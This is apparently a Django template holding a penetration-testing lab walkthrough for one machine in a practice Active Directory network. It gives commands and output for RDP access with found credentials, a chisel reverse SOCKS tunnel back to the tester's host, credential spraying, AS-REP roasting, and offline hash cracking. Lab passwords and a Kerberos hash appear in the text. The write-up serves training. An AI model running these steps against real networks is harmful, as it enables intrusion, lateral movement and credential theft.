@@ -1,0 +1,272 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX191</h1>
+    <h2 class="subtitle">RDP</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2/191]
+└─$ nxc winrm 192.168.212.191 -u dmzadmin -p 'SlimGodhoodMope'
+WINRM       192.168.212.191 5985   LOGIN            [*] Windows Server 2022 Build 20348 (name:LOGIN) (domain:relia.com)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       192.168.212.191 5985   LOGIN            [-] relia.com\dmzadmin:SlimGodhoodMope
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab2/191]
+└─$ nxc rdp 192.168.212.191 -u dmzadmin -p 'SlimGodhoodMope'
+RDP         192.168.212.191 3389   LOGIN            [*] Windows 10 or Windows Server 2016 Build 20348 (name:LOGIN) (domain:relia.com) (nla:True)
+RDP         192.168.212.191 3389   LOGIN            [-] relia.com\dmzadmin:SlimGodhoodMope (STATUS_LOGON_FAILURE)
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab2/191]
+└─$ nxc rdp 192.168.212.191 -u dmzadmin -p 'SlimGodhoodMope' --local-auth
+RDP         192.168.212.191 3389   LOGIN            [*] Windows 10 or Windows Server 2016 Build 20348 (name:LOGIN) (domain:LOGIN) (nla:True)
+RDP         192.168.212.191 3389   LOGIN            [+] LOGIN\dmzadmin:SlimGodhoodMope (Pwn3d!)</code></pre></div>
+<p class="text">Though we cannot use winrm, rdp is available for dmzadmin user. Additionally, the user has admin privilege. Let's simply enter box191. We can use remmina again.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/relia/191/1.png' %}" alt="">
+    <p class="text">We have proof.txt. There is no local.txt on this machine. Since the user dmzadmin is administrator on this machine, we can run powershell.exe as administrator.</p>
+</div>
+
+
+
+<h2 class="subtitle">Pivoting</h2>
+<div class="code-box"><pre><code>PS C:\Users\dmzadmin\desktop> <u>arp -a</u>
+
+Interface: 192.168.212.191 --- 0xe
+  Internet Address      Physical Address      Type
+  192.168.50.254        00-50-56-ab-2b-ce     dynamic
+  192.168.212.254       00-50-56-ab-2b-ce     dynamic
+  192.168.212.255       ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static
+
+Interface: 172.16.172.254 --- 0x10
+  Internet Address      Physical Address      Type
+  172.16.172.6          00-50-56-ab-a2-10     dynamic
+  172.16.172.7          00-50-56-ab-83-2f     dynamic
+  172.16.172.14         00-50-56-ab-4d-29     dynamic
+  172.16.172.15         00-50-56-ab-9f-5e     dynamic
+  172.16.172.21         00-50-56-ab-f5-ac     dynamic
+  172.16.172.30         00-50-56-ab-10-5a     dynamic
+  172.16.172.255        ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static</code></pre></div>
+  <p class="text">If we could pivot tunnel, we can be able to access to IPs start from 172.</p>
+  <p class="text">For that purpose, we can use chisel.exe.</p>
+
+  <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Linux]
+└─$ ./chisel server -p 8001 --reverse
+2025/11/20 16:24:37 server: Reverse tunnelling enabled
+2025/11/20 16:24:37 server: Fingerprint vhIl7BmT+kJfJhNSv9rPrfH+/TZ/w8vRpyUC/5mLKdQ=
+2025/11/20 16:24:37 server: Listening on http://0.0.0.0:8001</code></pre></div>
+
+<div class="code-box"><pre><code>PS C:\Users\dmzadmin\desktop> net use \\192.168.45.246\share /user:a a
+The command completed successfully.
+
+PS C:\Users\dmzadmin\desktop> copy \\192.168.45.246\share\chisel.exe</code></pre></div>
+<div class="code-box"><pre><code>PS C:\Users\dmzadmin\desktop> .\chisel.exe client 192.168.45.246:8001 R:socks
+2025/11/20 13:27:05 client: Connecting to ws://192.168.45.246:8001
+2025/11/20 13:27:06 client: Connected (Latency 95.4357ms)</code></pre></div>
+
+<p class="text">We can use proxychians4.</p>
+<p class="text">For utility purpose, let's create AD subnet IP list.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ cat internal 
+172.16.172.6
+172.16.172.7
+172.16.172.14
+172.16.172.15
+172.16.172.19
+172.16.172.20
+172.16.172.21
+172.16.172.30</code></pre></div>
+
+<p class="text">Let's find out their hostname.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ proxychains4 nxc smb internal -u jim -p 'Castello1!'            
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+SMB         172.16.172.7    445    INTRANET         [*] Windows Server 2022 Build 20348 x64 (name:INTRANET) (domain:relia.com) (signing:False) (SMBv1:False)                                                                                                      
+SMB         172.16.172.14   445    WK01             [*] Windows 11 Build 22000 x64 (name:WK01) (domain:relia.com) (signing:False) (SMBv1:False)
+SMB         172.16.172.6    445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:relia.com) (signing:True) (SMBv1:False)                                                                                                           
+SMB         172.16.172.30   445    WEBBY            [*] Windows Server 2022 Build 20348 x64 (name:WEBBY) (domain:relia.com) (signing:False) (SMBv1:False)                                                                                                         
+SMB         172.16.172.15   445    WK02             [*] Windows 11 Build 22000 x64 (name:WK02) (domain:relia.com) (signing:False) (SMBv1:False)
+SMB         172.16.172.21   445    FILES            [*] Windows Server 2022 Build 20348 x64 (name:FILES) (domain:relia.com) (signing:False) (SMBv1:False)                                                                                                         
+SMB         172.16.172.7    445    INTRANET         [+] relia.com\jim:Castello1! 
+SMB         172.16.172.14   445    WK01             [+] relia.com\jim:Castello1! 
+SMB         172.16.172.6    445    DC02             [+] relia.com\jim:Castello1! 
+SMB         172.16.172.30   445    WEBBY            [+] relia.com\jim:Castello1! 
+SMB         172.16.172.15   445    WK02             [+] relia.com\jim:Castello1! 
+SMB         172.16.172.21   445    FILES            [+] relia.com\jim:Castello1! </code></pre></div>
+
+<p class="text">The 6 of 8 boxes open smb server. Also, we revealed the BOX6 is DomainController.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ proxychains4 nxc ssh internal -u jim -p 'Castello1!'
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+SSH         172.16.172.19   22     172.16.172.19    [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
+SSH         172.16.172.19   22     172.16.172.19    [-] jim:Castello1!
+SSH         172.16.172.20   22     172.16.172.20    [*] SSH-2.0-OpenSSH_7.9 FreeBSD-20200214
+SSH         172.16.172.20   22     172.16.172.20    [-] jim:Castello1!</code></pre></div>
+
+<p class="text">Also. the target box19 and box20 use ssh, which mean they use linux OS.</p>
+
+<h2 class="subtitle">As-REP roasting</h2>
+<p class="text">Since we got valid user for AD, we can check if there is user who is vulnerable to AS-REP roasting.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ proxychains4 nxc smb 172.16.172.6 -u jim -p 'Castello1!' --users \
+  | awk 'NF>=5 && $5 !~ /^\[/ && $5 !~ /^-/ {print $5}' \
+  > users.txt
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ cat users.txt      
+Administrator
+Guest
+krbtgt
+maildmz
+jim
+michelle
+andrea
+mountuser
+iis_service
+internaladmin
+larry
+jenny
+brad
+anna
+dan
+milana</code></pre></div>
+
+<p class="text">Then, test them.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ for user in $(cat users.txt);do proxychains4 impacket-GetNPUsers relia.com/$user -request -no-pass -dc-ip 172.16.172.6;done
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+...
+[*] Getting TGT for michelle
+$krb5asrep$23$michelle@RELIA.COM:c0bbfafb764d4411363ea668f8ac83f5$5059db5cef288b762d8623fc56218f65be1eb0b51b505bb735479c18ad766da978ebc9ed96da973fb3157b6ac89e403a9ec3d8f55cda2d24e5d1fb923c1b5711a206903d4769918c235b7fb68223c1f0b0047825ee4c929ce8e0d83417e75ae4e9f9184d4d53821150fca92ca67abd5c421fbcef99896a3db3391eaf31b65fed49bf3833cb3816d4bd86a56e248277d07294070bfe652b04169668f2f0e94d80273a467eefcab23d3ba8478fcdc9491300181bf26f9b9bfc990b764465aaf03680aed6bffca96b628f8b33d9043fc5bbc834172413afa7131615e6cfbcb5ef8a4c1bb1c56dc0</code></pre></div>
+
+<p class="text">The user michelle was vulnerable to AS-REP roasting. Let's try to crack this hash and use it.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ echo '$krb5asrep$23$michelle@RELIA.COM:c0bbfafb764d4411363ea668f8ac83f5$5059db5cef288b762d8623fc56218f65be1eb0b51b505bb735479c18ad766da978ebc9ed96da973fb3157b6ac89e403a9ec3d8f55cda2d24e5d1fb923c1b5711a206903d4769918c235b7fb68223c1f0b0047825ee4c929ce8e0d83417e75ae4e9f9184d4d53821150fca92ca67abd5c421fbcef99896a3db3391eaf31b65fed49bf3833cb3816d4bd86a56e248277d07294070bfe652b04169668f2f0e94d80273a467eefcab23d3ba8478fcdc9491300181bf26f9b9bfc990b764465aaf03680aed6bffca96b628f8b33d9043fc5bbc834172413afa7131615e6cfbcb5ef8a4c1bb1c56dc0' > hash
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/lab2]
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
+Will run 5 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<u>NotMyPassword0k?</u> ($krb5asrep$23$michelle@RELIA.COM)     
+1g 0:00:00:06 DONE (2025-11-20 16:42) 0.1594g/s 1718Kp/s 1718Kc/s 1718KC/s Novia..NorthTexas1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</code></pre></div>
+
+<p class="text">We got new user.</p>
+
+<p class="text">Back to the BOX191's desktop, we have to check privilege of users michelle and jim. </p>
+<div class="code-box"><pre><code>PS C:\Users\dmzadmin> runas /user:relia.com\jim "cmd"
+Enter the password for relia.com\jim:
+Attempting to start cmd as user "relia.com\jim" ...</code></pre></div>
+<div class="code-box"><pre><code>C:\Windows\system32>net user /domain
+The request will be processed at a domain controller for domain relia.com.
+
+
+User accounts for \\DC02.relia.com
+
+-------------------------------------------------------------------------------
+Administrator            andrea                   anna
+brad                     dan                      Guest
+iis_service              internaladmin            jenny
+jim                      krbtgt                   larry
+maildmz                  michelle                 milana
+mountuser
+The command completed successfully.
+
+
+C:\Windows\system32>net user jim /domain
+The request will be processed at a domain controller for domain relia.com.
+
+User name                    jim
+Full Name                    Jim da Silva
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/19/2022 3:27:02 AM
+Password expires             Never
+Password changeable          10/20/2022 3:27:02 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   11/20/2025 2:02:19 PM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users
+The command completed successfully.</code></pre></div>
+
+<p class="text">The user jim is normal user, who doesn't have any permission.</p>
+<div class="code-box"><pre><code>C:\Windows\system32>net user michelle /domain
+The request will be processed at a domain controller for domain relia.com.
+
+User name                    michelle
+Full Name                    Michelle Smith
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/27/2022 1:07:31 AM
+Password expires             Never
+Password changeable          10/28/2022 1:07:31 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   11/20/2025 1:41:02 PM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *<u>INTRANETRDP</u>
+The command completed successfully.</code></pre></div>
+
+<p class="text">She has INTRANETRDP privilege! The hostname of BOX7 was INTRANET. So, we can access to the host with user michelle.</p>
+<p class="text">The next target is BOX7...!</p>
+
+
+</body>
+</html>
